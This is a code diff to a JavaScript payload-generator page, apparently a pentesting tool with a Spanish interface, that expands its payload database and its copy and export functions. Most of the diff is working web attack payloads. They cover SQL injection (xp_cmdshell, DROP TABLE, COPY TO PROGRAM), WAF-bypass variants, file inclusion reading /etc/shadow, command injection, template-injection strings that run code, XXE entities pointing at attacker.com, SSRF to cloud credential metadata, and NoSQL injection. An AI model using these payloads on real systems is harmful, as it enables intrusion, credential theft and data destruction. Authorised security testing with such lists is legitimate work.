+      error:["' OR 1=1--","' OR '1'='1","' OR 1=1#","admin'--","1' AND SLEEP(5)--","' UNION SELECT null,null,null--","' UNION SELECT user(),database(),version()--","1 AND 1=2 UNION SELECT 1,2,3--","' AND extractvalue(1,concat(0x7e,user()))--","' AND updatexml(1,concat(0x7e,user()),1)--"],
+      blind_bool:["1' AND 1=1--","1' AND 1=2--","1' AND substring(username,1,1)='a'--","1' AND (SELECT count(*) FROM information_schema.tables)\u003e0--","1 AND (SELECT 1 FROM users WHERE username='admin' AND length(password)\u003e5)=1--"],
+      blind_time:["1' AND SLEEP(5)--","1;WAITFOR DELAY '0:0:5'--","1' AND (SELECT SLEEP(5) FROM users WHERE 1=1)--","1 OR pg_sleep(5)--","' OR 1=1 WAITFOR DELAY '0:0:5'--"],
+      union:["' UNION SELECT null--","' UNION SELECT null,null--","' UNION SELECT table_name,null FROM information_schema.tables--","' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--","' UNION SELECT username,password FROM users--"],
+      stacked:["'; INSERT INTO users (username,password) VALUES ('hacked','hacked')--","'; EXEC xp_cmdshell('whoami')--","'; DROP TABLE users--","1; EXEC sp_configure 'show advanced options',1; RECONFIGURE--"]
     },
-    cloudflare:{url:["1'/**/OR/**/1=1--","1'%09OR%091=1--","1'%0aOR%0a1=1--","1' /*!50000OR*/ 1=1--","1'||'1'='1","1' oR '1'='1"]},
-    modsec:{url:["1'/*!OR*/1=1--","1' OR 1/**/=/**/1--","1'%00OR%001=1--","1' OR 0x31=0x31--","1' OR char(49)=char(49)--"]},
-    awswaf:{url:["1' OR '1'='1' AND 'a'='a","1;SELECT/**/1","1 UNION/**/SELECT/**/null","1'%0bOR%0b'1'='1"]},
+    cloudflare:{
+      error:["'/**/OR/**/1=1--","%27%20OR%201%3D1--","'%0aOR%0a'1'%3d'1","1'%09AND%09'1'%3d'1","' /*!OR*/ 1=1--","'||'1'='1"],
+      union:["'%20UNION%20SELECT%20null--","' UNION%0aSELECT%0anull--","'/**/UNION/**/SELECT/**/null--","' UNION /*!SELECT*/ null--"]
+    },
+    mssql:["' OR 1=1--","'; EXEC xp_cmdshell('whoami')--","'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--","1 UNION SELECT name,NULL FROM sys.databases--","' OR 1=1; INSERT INTO users VALUES ('x','x')--","1; DROP TABLE users--"],
+    oracle:["' OR 1=1--","' UNION SELECT null FROM DUAL--","' UNION SELECT banner,null FROM v$version--","' UNION SELECT table_name,null FROM all_tables--","' AND 1=1--","1 AND (SELECT COUNT(*) FROM all_tables)\u003e0--"],
+    postgres:["' OR 1=1--","' UNION SELECT null::text--","'; SELECT pg_sleep(5)--","' UNION SELECT table_name,null FROM information_schema.tables--","'; COPY (SELECT '') TO PROGRAM 'whoami'--","' OR 1=1; SELECT pg_sleep(5)--"]
   },
-  lfi:{none:{url:['../../../etc/passwd','../../../../etc/passwd','....//....//....//etc/passwd','..%2F..%2F..%2Fetc%2Fpasswd','..%252F..%252F..%252Fetc%252Fpasswd','/etc/passwd%00','php://filter/convert.base64-encode/resource=index.php','php://filter/read=string.rot13/resource=index.php','php://input','expect://id','data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=','file:///etc/passwd','..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts']}},
-  rce:{none:{url:['; id','| id','|| id','& id','&& id','` id `','$(id)','; cat /etc/passwd','| cat /etc/passwd','\\n/usr/bin/id','1;ls -la','1|whoami','1&&whoami'],json:['$(id)','`;id`','| id #','"$(id)"']}},
-  ssti:{none:{url:['{{7*7}}','{{7*\'7\'}}','${7*7}','#{7*7}','<%= 7*7 %>','{{config}}','{{self.__dict__}}','{{request.environ}}','${T(java.lang.Runtime).getRuntime().exec(\'id\')}','{{\'\'.__class__.__mro__[1].__subclasses__()}}','{% for x in ().__class__.__base__.__subclasses__() %}{{x}}{% endfor %}']}},
-  xxe:{none:{xml:['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>','<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><root>&xxe;</root>']}},
-  open_redirect:{none:{url:['//attacker.com','//attacker.com/%2F..','https://attacker.com','https:attacker.com','https://google.com@attacker.com','https://attacker.com#.google.com','/\\\\attacker.com','//attacker%00.com','javascript:alert(document.domain)']}},
-  ssrf:{none:{url:['http://127.0.0.1','http://localhost','http://0.0.0.0','http://[::1]','http://169.254.169.254/latest/meta-data/','http://metadata.google.internal/computeMetadata/v1/','http://169.254.169.254/latest/meta-data/iam/security-credentials/','http://0177.0.0.1','http://0x7f000001','http://2130706433','dict://127.0.0.1:6379/info','gopher://127.0.0.1:9200/_GET%20/','http://127.0.0.1:22','http://127.0.0.1:3306']}},
-};
+  lfi:{
+    none:['../../etc/passwd','../../../etc/shadow','....//....//etc/passwd','..%2F..%2Fetc%2Fpasswd','..%252F..%252Fetc%252Fpasswd','/etc/passwd%00','/etc/passwd%00.jpg','php://filter/convert.base64-encode/resource=index.php','php://filter/read=string.rot13/resource=index.php','php://input','data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=','expect://whoami','file:///etc/passwd','/proc/self/environ','/var/log/apache2/access.log','/var/log/nginx/access.log'],
+    windows:['..\\..\\windows\\win.ini','..%5C..%5Cwindows%5Cwin.ini','....\\\\....\\\\windows\\\\win.ini','C:\\windows\\win.ini','C:\\boot.ini','C:\\inetpub\\wwwroot\\web.config','%SYSTEMROOT%\\win.ini','../../../../../../../../../../windows/win.ini'],
+    bypass:['....//....//....//etc/passwd','..///////..////..//////etc/passwd','/%5C../%5C../%5C../etc/passwd','/../../etc/passwd','/var/www/../../etc/passwd','....\/....\/etc/passwd']
+  },
+  rce:{
+    unix:['`id`','$(id)',';id;','|id|','$(cat /etc/passwd)','|| id ||','& id &','; cat /etc/passwd ;','| cat /etc/passwd |','`cat /etc/passwd`','$(whoami)','${IFS}id','%0aid','%0a/bin/sh%0a'],
+    windows:['; dir ;','| dir |','& dir &','|| dir ||','`dir`','$(dir)','& whoami &','| whoami |','; whoami ;'],
+    ssti_test:['{{7*7}}','${7*7}','\u003c%= 7*7 %\u003e','#{7*7}','*{7*7}','${\"freemarker.template.utility.Execute\"?new()(\"id\")}','{{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}'],
+    bypass:['%0aid','%0a/bin/sh','%3bid','%7cid','%26id',';${IFS}id',';{id,}',';+id']
+  },
+  ssti:{
+    jinja2:['{{7*7}}','{{7*\'7\'}}','{{config}}','{{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}','{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}','{{lipsum.__globals__.os.popen(\'id\').read()}}','{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__[\'__import__\'](\'os\').popen(\'id\').read()}}{% endif %}{% endfor %}'],
+    twig:['{{7*7}}','{{7*"7"}}','{{dump(app)}}','{{app.request.server.all|join(\',\')}}','{{\'id\'|filter(\'system\')}}'],
+    freemarker:['${7*7}','${"freemarker.template.utility.Execute"?new()("id")}','[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}'],
+    erb:['\u003c%= 7*7 %\u003e','\u003c%= `id` %\u003e','\u003c%= system("id") %\u003e','\u003c%=`ls`%\u003e'],
+    mvel:['${user.class}','${12345.class.forName("java.lang.Runtime").getMethod("exec",String.class.arrayType()).invoke(12345.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}']
+  },
+  xxe:['\u003c?xml version="1.0"?\u003e\u003c!DOCTYPE root [\u003c!ENTITY xxe SYSTEM "file:///etc/passwd"\u003e]\u003e\u003croot\u003e&xxe;\u003c/root\u003e','\u003c?xml version="1.0"?\u003e\u003c!DOCTYPE root [\u003c!ENTITY xxe SYSTEM "http://attacker.com/xxe"\u003e]\u003e\u003croot\u003e&xxe;\u003c/root\u003e','\u003c?xml version="1.0"?\u003e\u003c!DOCTYPE root [\u003c!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"\u003e%xxe;]\u003e','\u003c?xml version="1.0" encoding="UTF-8"?\u003e\u003c!DOCTYPE foo [\u003c!ELEMENT foo ANY\u003e\u003c!ENTITY xxe SYSTEM "file:///etc/shadow"\u003e]\u003e\u003cfoo\u003e&xxe;\u003c/foo\u003e','\u003c?xml version="1.0"?\u003e\u003c!DOCTYPE data [\u003c!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"\u003e]\u003e\u003cdata\u003e&file;\u003c/data\u003e'],
+  open_redirect:['//evil.com','//evil.com%2F..','https://evil.com','/\\evil.com','/%09/evil.com','/%2F/evil.com','/.evil.com','//google.com%0d%0aLocation://evil.com','javascript:alert(document.domain)','https:evil.com','//\tevil.com'],
+  ssrf:['http://localhost/','http://127.0.0.1/','http://169.254.169.254/latest/meta-data/','http://[::1]/','http://0.0.0.0/','http://2130706433/','http://0177.0.0.1/','http://[::]/:80','dict://localhost:11211/','file:///etc/passwd','http://localhost:6379/','http://localhost:27017/','gopher://127.0.0.1:3306/_','http://metadata.google.internal/computeMetadata/v1/'],
+  nosqli:["' || '1'=='1","' || 1==1//","'; return true; var x='","{ $gt: '' }","{\"$where\": \"this.username == this.password\"}","{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}","{\"$regex\": \".*\"}","[$ne]=1","[$gt]=","[$where]=this.password.length\u003e0"],
+  deserialization:['rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZE9iamVjdFNlcmlhbGl6YXRpb25UZXN0','O:8:"stdClass":0:{}','{"__class__":"os.system","args":["id"]}','{"type":"Foo","data":"bar"}','a:2:{i:0;s:4:"test";i:1;s:4:"test";}']
+}
 var _ptPayloads=[];
 
 function genPayloads(){
   var vuln=(document.getElementById('pt-vuln')||{value:'xss'}).value;
   var wafType=(document.getElementById('pt-waf')||{value:'none'}).value;
-  var ctx=(document.getElementById('pt-context')||{value:'url'}).value;
+  var ctx=(document.getElementById('pt-context')||{value:'html'}).value;
   var outEl=document.getElementById('out-payload');
   var cntEl=document.getElementById('pt-count');
   if(!outEl) return;
   var db=PT_DB[vuln]||{};
-  var generic=(db['none']&&db['none'][ctx])||(db['none']&&db['none']['url'])||[];
-  var specific=(db[wafType]&&wafType!=='none'&&(db[wafType][ctx]||db[wafType]['url']))||[];
-  var combined=[...new Set([...specific,...generic])];
+  var combined=[];
+
+  // Helper: flatten any object/array into a list of strings
+  function flattenPayloads(obj){
+    if(!obj) return [];
+    if(Array.isArray(obj)) return obj;
+    // It's an object — collect all values
+    var out=[];
+    Object.keys(obj).forEach(function(k){
+      var v=obj[k];
+      if(Array.isArray(v)) out=out.concat(v);
+      else if(typeof v==='object') out=out.concat(flattenPayloads(v));
+    });
+    return out;
+  }
+
+  // XSS: nested by none/cloudflare/modsec + ctx (html/attr/js/url)
+  if(vuln==='xss'){
+    var generic=(db['none']&&db['none'][ctx])||(db['none']&&db['none']['html'])||[];
+    var specific=(wafType!=='none'&&db[wafType])?(db[wafType][ctx]||db[wafType]['html']||flattenPayloads(db[wafType])):[];
+    combined=[...new Set([...specific,...generic])];
+  } else {
+    // All other types: flat or nested by technique (error/blind/union etc)
+    // Show WAF-specific if selected, else show 'none' or flatten all
+    if(wafType!=='none'&&db[wafType]){
+      combined=flattenPayloads(db[wafType]);
+    } else if(db['none']){
+      combined=flattenPayloads(db['none']);
+    } else {
+      // Type is flat array (xxe, ssrf, nosqli, open_redirect, deserialization)
+      combined=flattenPayloads(db);
+    }
+    combined=[...new Set(combined)];
+  }
+
   _ptPayloads=combined;
   if(cntEl) cntEl.textContent=combined.length+' payloads';
-  var html='<span style="color:rgba(0,255,65,.4)">// '+escH(vuln.toUpperCase())+' — '+(wafType==='none'?'Generic':escH(wafType))+' — ctx:'+escH(ctx)+'</span>\n\n';
+  var wafLabel=wafType==='none'?'Generic':wafType.toUpperCase();
+  var ctxLabel=vuln==='xss'?'ctx:'+ctx:'';
+  var html='<span style="color:rgba(0,255,65,.4)">// '+escH(vuln.toUpperCase())+' — '+escH(wafLabel)+(ctxLabel?' — '+ctxLabel:'')+'</span>\n\n';
   combined.forEach(function(p,i){
     html+='<div style="display:flex;align-items:flex-start;gap:6px;margin:2px 0;padding:3px 0;border-bottom:1px solid rgba(0,255,65,.05);">'+
-      '<span style="color:rgba(0,255,65,.25);min-width:20px;font-size:.58rem;">'+(i+1)+'</span>'+
+      '<span style="color:rgba(0,255,65,.25);min-width:20px;font-size:.58rem;">'+( i+1)+'</span>'+
       '<code style="flex:1;color:rgba(0,255,65,.8);word-break:break-all;font-size:.65rem;">'+escH(p)+'</code>'+
-      '<button onclick="navigator.clipboard.writeText('+JSON.stringify(JSON.stringify(p))+')" style="background:transparent;border:1px solid rgba(0,255,65,.15);color:rgba(0,255,65,.4);font-family:var(--font);font-size:.55rem;padding:1px 5px;cursor:pointer;flex-shrink:0;">⧉</button>'+
+      '<button data-pi="'+i+'" class="pt-copy-btn" style="background:transparent;border:1px solid rgba(0,255,65,.15);color:rgba(0,255,65,.4);font-family:var(--font);font-size:.55rem;padding:1px 5px;cursor:pointer;flex-shrink:0;">⧉</button>'+
       '</div>';
   });
-  if(!combined.length) html+='<span style="color:var(--amber)">// Sin payloads para esta combinación</span>';
+  if(!combined.length) html+='<span style="color:var(--amber)">// Sin payloads para esta combinación — prueba WAF: Generic</span>';
   outEl.innerHTML=html; outEl.classList.add('show');
+  // Event delegation — avoids inline onclick with special chars
+  outEl.onclick=function(ev){
+    var btn=ev.target.closest('.pt-copy-btn');
+    if(!btn) return;
+    var idx=parseInt(btn.getAttribute('data-pi'));
+    if(_ptPayloads&&_ptPayloads[idx]!==undefined){
+      navigator.clipboard.writeText(_ptPayloads[idx]).then(function(){
+        btn.textContent='✓';setTimeout(function(){btn.textContent='⧉';},1200);
+      }).catch(function(){});
+    }
+  };
 }
 function ptCopyAll(){if(!_ptPayloads.length){alert('Genera payloads primero');return;}navigator.clipboard.writeText(_ptPayloads.join('\n')).then(function(){alert('✓ '+_ptPayloads.length+' payloads copiados');});}
 function ptExport(){if(!_ptPayloads.length){alert('Genera payloads primero');return;}var t=(document.getElementById('pt-vuln')||{value:'xss'}).value;var w=(document.getElementById('pt-waf')||{value:'none'}).value;var a=document.createElement('a');a.href=URL.createObjectURL(new Blob([_ptPayloads.join('\n')],{type:'text/plain'}));a.download='payloads_'+t+'_'+w+'_'+Date.now()+'.txt';a.click();}
